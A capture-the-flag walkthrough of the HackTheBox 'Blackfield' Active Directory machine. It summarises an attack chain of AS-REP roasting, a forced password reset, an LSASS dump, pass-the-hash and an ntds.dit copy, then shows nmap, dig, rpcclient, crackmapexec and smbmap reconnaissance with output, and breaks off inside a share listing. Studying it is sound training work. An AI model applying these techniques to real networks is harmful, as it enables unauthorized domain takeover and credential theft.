
```
Machine: Blackfield
Difficult: Hard
Platform: HackTheBox
Release: Released on 06/06/2020
```

## About Blackfield:

#### Foothold

Blackfield is a hard level machine on the HackTheBox platform. It is an Active Directory-based environment, where our initial reconnaissance involved analyzing a network-level shared resource exposed through SMB. This shared resource hosted an extensive array of directories, seemingly corresponding to usernames. We proceeded to extract all these directory names and subsequently embarked on enumerating whether any of them were associated with system users. We identified three valid users, one of whom was found to be susceptible to an ASREP Roast attack.

We successfully obtained the Ticket Granting Ticket (TGT) for the relevant user, successfully decrypted it, and acquired valid credentials for the 'Support' user.

Subsequently, we executed the 'bloodhound-python' tool to conduct a comprehensive scan of the Domain Controller and, by extension, the entire Active Directory environment. Through this scanning process, we identified a vulnerability that allowed us to change the password of the 'audit2020' user, leveraging the 'ForceChangePassword' attribute that we had access to.

#### Shell as svc_backup

After successfully changing the password for the 'audit2020' user, we were able to gain access to a network-level shared resource via SMB. This shared resource contained critical information, including a memory dump of the LSASS process. Using the 'pypykatz' tool, we were able to perform a dump of the LSASS and obtain NT hash credentials for the 'svc_backup' user.

Fortunately, the 'svc_backup' user is a member of the 'Remote Management Users' group, enabling us to utilize their credentials (via the PassTheHash technique using the NT hash) to access the WinRM service. Using the 'Evil-WinRM' tool, we successfully established a remote connection and obtained a remote console on the system.

#### Shell as Administrator

  
As the 'svc_backup' user, we possess the 'SeBackupPrivilege' privilege, which allows us to create backups of any system file, regardless of whether Administrator privileges are required. Using the DiskShadow tool, we created a 'shadow copy' of the root structure of the system on a logical drive. Subsequently, with the 'robocopy' command, we created a copy of the 'ntds.dit' file and the system registry. These files enabled us to perform a dump and obtain the NT hashes for all domain-level users, ultimately granting us administrative access. 


---

### Recon 

Before initiating any exploitation processes, it is crucial to acquire a comprehensive understanding of the attack surface, which encompasses services, technologies, systems, and other relevant aspects. It is imperative to emphasize that conducting thorough enumeration constitutes a critical component as it provides a solid foundation for success in the subsequent exploitation of the services exposed by the target machine.

First and foremost, it is essential to conduct a scanning operation to ascertain which ports are accessible on the target machine, as these ports serve as entry points to the services exposed by it.

```
elswix@kali$ sudo nmap -p- --open -sS --min-rate 5000 -v -n -Pn 10.10.10.192 -oG portScan 

PORT     STATE SERVICE        REASON
53/tcp   open  domain         syn-ack ttl 127
88/tcp   open  kerberos-sec   syn-ack ttl 127
135/tcp  open  msrpc          syn-ack ttl 127
389/tcp  open  ldap           syn-ack ttl 127
445/tcp  open  microsoft-ds   syn-ack ttl 127
593/tcp  open  http-rpc-epmap syn-ack ttl 127
3268/tcp open  globalcatLDAP  syn-ack ttl 127
5985/tcp open  wsman          syn-ack ttl 127
```

At first glance, it appears that we are dealing with an environment that utilizes Active Directory. This assumption is based on the presence of ports typically associated with Active Directory environments, such as port 88 (commonly hosting the Kerberos service), port 389 (typically housing the LDAP service), and port 135 (usually hosting the RPC service).

Subsequently, we will proceed with a comprehensive scan to identify the technologies, services, and versions running on these ports, which will contribute to a detailed reconnaissance of the environment.

```
elswix@kali$ nmap -sCV -p53,88,135,389,445,593,3268,5985 10.10.10.192 -oN fullScan -Pn

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-09-20 20:09:56Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```


In the initial step, we are provided with relevant information, such as the domain name.

I will proceed to add the 'BLACKFIELD.local' domain to my '/etc/hosts' file, referencing the victim machine's IP address:

```
elswix@kali$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	Kali.localhost	Kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

# HackTheBox
10.10.10.192 BLACKFIELD.local
```



### DNS Enumeration 

To begin, we will initiate the enumeration of the DNS service available through port 53. To carry out this task, we will employ the 'dig' tool.

```
elswix@kali$ dig @10.10.10.192 BLACKFIELD.local 
; <<>> DiG 9.18.16-1-Debian <<>> @10.10.10.192 BLACKFIELD.local
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 23258
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;BLACKFIELD.local.		IN	A

;; ANSWER SECTION:
BLACKFIELD.local.	600	IN	A	10.10.10.192

;; Query time: 144 msec
;; SERVER: 10.10.10.192#53(10.10.10.192) (UDP)
;; WHEN: Wed Sep 20 19:58:14 -03 2023
;; MSG SIZE  rcvd: 61
```


###### Name Server

  
We proceed to enumerate the Name Servers:

This command will utilize the 'dig' tool to retrieve information about the Name Servers associated with the 'BLACKFIELD.local' domain.

```
elswix@kali$ dig @10.10.10.192 BLACKFIELD.local ns

; <<>> DiG 9.18.16-1-Debian <<>> @10.10.10.192 BLACKFIELD.local ns
; (1 server found)
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 16770
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 4

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;BLACKFIELD.local.		IN	NS

;; ANSWER SECTION:
BLACKFIELD.local.	3600	IN	NS	dc01.BLACKFIELD.local.

;; ADDITIONAL SECTION:
dc01.BLACKFIELD.local.	3600	IN	A	10.10.10.192
dc01.BLACKFIELD.local.	3600	IN	AAAA	dead:beef::bdb2:5cba:f7f7:d9fa
dc01.BLACKFIELD.local.	3600	IN	AAAA	dead:beef::219

;; Query time: 144 msec
;; SERVER: 10.10.10.192#53(10.10.10.192) (UDP)
;; WHEN: Wed Sep 20 19:59:10 -03 2023
;; MSG SIZE  rcvd: 136
```


We have been provided with information suggesting the existence of a subdomain. Immediately, I will add this subdomain to my '/etc/hosts' file:

```
elswix@kali$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	Kali.localhost	Kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

# HackTheBox
10.10.10.192 BLACKFIELD.local dc01.BLACKFIELD.local
```

###### Transfer Zone

When attempting a Zone Transfer attack, we observed that it was not successful:

```
elswix@kali$ dig @10.10.10.192 BLACKFIELD.local axfr
; <<>> DiG 9.18.16-1-Debian <<>> @10.10.10.192 BLACKFIELD.local axfr
; (1 server found)
;; global options: +cmd
; Transfer failed.
```

While it is possible to enumerate the mail servers and other services, at this moment, that information is not relevant to our current objectives.


### RPC Enumeration 

  
Now, we proceed to enumerate the RPC service, which appears to allow us to establish connections without the need for credentials, in other words, it allows us to create a null session:

```
elswix@kali$ rpcclient -U "" 10.10.10.192 -N
rpcclient $> 
```

When attempting to retrieve information about the Domain Controller (DC), we are notified that access has been denied. It appears that we can establish a connection, but we do not have access to the Domain Controller's information.

```
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> enumdomgroups
result was NT_STATUS_ACCESS_DENIED
rpcclient $> 
```


### SMB Enumeration 

Next, we will commence the enumeration of the SMB service, which is located on port 445. To accomplish this, we will utilize the [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec) tool.

```
elswix@kali$ crackmapexec smb 10.10.10.192
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
```

  
"The enumeration of the SMB service does not yield very relevant information. However, we can note that the operating system in use is Windows, specifically Windows 10. Furthermore, the hostname of the machine is provided as 'DC01'. From this information, we can deduce that we are connecting directly to the Domain Controller.

A recommended practice is to add the HOSTNAME to the '/etc/hosts' file.

```
elswix@kali$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	Kali.localhost	Kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

# HackTheBox
10.10.10.192 BLACKFIELD.local DC01 dc01.BLACKFIELD.local
```


##### Shared resources

Normally, in companies that adhere to good security practices, valid credentials are required to access these shared resources. However, on occasion, connections using a Null Session or a Guest Session may allow access to shared resources without the need for prior authentication.

In my case, I will opt to use a Guest Session, once again employing [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec).

```
elswix@kali$ crackmapexec smb 10.10.10.192 -u "elswix" -p "" --shares
SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\elswix: 
SMB         10.10.10.192    445    DC01             [+] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             -----           -----------     ------
SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.10.192    445    DC01             C$                              Default share
SMB         10.10.10.192    445    DC01             forensic                        Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON                        Logon server share 
SMB         10.10.10.192    445    DC01             profiles$       READ            
SMB         10.10.10.192    445    DC01             SYSVOL                          Logon server share 
```

We have access to two shared resources: 'profiles$' and 'IPC$'. The more relevant of the two is 'profiles$'.

To perform the enumeration of the shared resources offered by this service, I will use the [SmbMap](https://github.com/ShawnDEvans/smbmap) tool.

```
elswix@kali$ smbmap -H 10.10.10.192 -u 'elswix' -r "profiles$"  
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 10.10.10.192:445	Name: BLACKFIELD.local    	Status: Guest session   	
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	forensic                                          	NO ACCESS	Forensic / Audit share.
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	profiles$                                         	READ ONLY	
	./profiles$
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	.
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	..
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	AAlleni
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	ABarteski
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	ABekesz
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	ABenzies
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	ABiemiller
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	AChampken
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	ACheretei
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	ACsonaki
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	AHigchens
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	AJaquemai
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	AKlado
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	AKoffenburger
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	AKollolli
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	AKruppe
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	AKubale
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	ALamerz
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	AMaceldon
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	AMasalunga
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	ANavay
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	ANesterova
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	ANeusse
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	AOkleshen
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	APustulka
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	ARotella
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	ASanwardeker
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	AShadaia
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	ASischo
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	ASpruce
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	ATakach
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	ATaueg
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	ATwardowski
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	audit2020
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	AWangenheim
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	AWorsey
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	AZigmunt
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	BBakajza
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	BBeloucif
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	BCarmitcheal
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	BConsultant
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	BErdossy
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	BGeminski
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	BLostal
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	BMannise
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	BNovrotsky
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	BRigiero
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	BSamkoses
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	BZandonella
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	CAcherman
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	CAkbari
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	CAldhowaihi
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	CArgyropolous
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	CDufrasne
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	CGronk
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	Chiucarello
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	Chiuccariello
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	CHoytal
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	CKijauskas
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	CKolbo
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	CMakutenas
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	CMorcillo
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	CSchandall
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	CSelters
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	CTolmie
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	DCecere
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	DChintalapalli
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	DCwilich
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	DGarbatiuc
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	DKemesies
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	DMatuka
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	DMedeme
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	DMeherek
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	DMetych
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	DPaskalev
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	DPriporov
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	DRusanovskaya
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	DVellela
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	DVogleson
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	DZwinak
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	EBoley
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	EEulau
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	EFeatherling
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	EFrixione
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	EJenorik
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	EKmilanovic
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	ElKatkowsky
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	EmaCaratenuto
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	EPalislamovic
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	EPryar
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	ESachhitello
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	ESariotti
	dr--r--r--                0 Wed Jun  3 13:47:11 2020	ETurgano
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	EWojtila
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	FAlirezai
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	FBaldwind
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	FBroj
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	FDeblaquire
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	FDegeorgio
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	FianLaginja
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	FLasokowski
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	FPflum
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	FReffey
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	GaBelithe
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	Gareld
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	GBatowski
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	GForshalger
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	GGomane
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	GHisek
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	GMaroufkhani
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	GMerewether
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	GQuinniey
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	GRoswurm
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	GWiegard
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	HBlaziewske
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	HColantino
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	HConforto
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	HCunnally
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	HGougen
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	HKostova
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	IChristijr
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	IKoledo
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	IKotecky
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	ISantosi
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	JAngvall
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	JBehmoiras
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	JDanten
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	JDjouka
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	JKondziola
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	JLeytushsenior
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	JLuthner
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	JMoorehendrickson
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	JPistachio
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	JScima
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	JSebaali
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	JShoenherr
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	JShuselvt
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	KAmavisca
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	KAtolikian
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	KBrokinn
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	KCockeril
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	KColtart
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	KCyster
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	KDorney
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	KKoesno
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	KLangfur
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	KMahalik
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	KMasloch
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	KMibach
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	KParvankova
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	KPregnolato
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	KRasmor
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	KShievitz
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	KSojdelius
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	KTambourgi
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	KVlahopoulos
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	KZyballa
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	LBajewsky
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	LBaligand
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	LBarhamand
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	LBirer
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	LBobelis
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	LChippel
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	LChoffin
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	LCominelli
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	LDruge
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	LEzepek
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	LHyungkim
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	LKarabag
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	LKirousis
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	LKnade
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	LKrioua
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	LLefebvre
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	LLoeradeavilez
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	LMichoud
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	LTindall
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	LYturbe
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	MArcynski
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	MAthilakshmi
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	MAttravanam
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	MBrambini
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	MHatziantoniou
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	MHoerauf
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	MKermarrec
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	MKillberg
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	MLapesh
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	MMakhsous
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	MMerezio
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	MNaciri
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	MShanmugarajah
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	MSichkar
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	MTemko
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	MTipirneni
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	MTonuri
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	MVanarsdel
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	NBellibas
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	NDikoka
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	NGenevro
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	NGoddanti
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	NMrdirk
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	NPulido
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	NRonges
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	NSchepkie
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	NVanpraet
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	OBelghazi
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	OBushey
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	OHardybala
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	OLunas
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	ORbabka
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	PBourrat
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	PBozzelle
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	PBranti
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	PCapperella
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	PCurtz
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	PDoreste
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	PGegnas
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	PMasulla
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	PMendlinger
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	PParakat
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	PProvencer
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	PTesik
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	PVinkovich
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	PVirding
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	PWeinkaus
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	RBaliukonis
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	RBochare
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	RKrnjaic
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	RNemnich
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	RPoretsky
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	RStuehringer
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	RSzewczuga
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	RVallandas
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	RWeatherl
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	RWissor
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SAbdulagatov
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SAjowi
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SAlguwaihes
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SBonaparte
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SBouzane
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SChatin
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SDellabitta
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SDhodapkar
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SEulert
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SFadrigalan
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SGolds
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SGrifasi
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SGtlinas
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SHauht
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SHederian
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SHelregel
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SKrulig
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SLewrie
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SMaskil
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	Smocker
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SMoyta
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SRaustiala
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SReppond
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SSicliano
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SSilex
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SSolsbak
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	STousignaut
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	support
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	svc_backup
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SWhyte
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	SWynigear
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	TAwaysheh
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	TBadenbach
	dr--r--r--                0 Wed Jun  3 13:47:12 2020	TCaffo
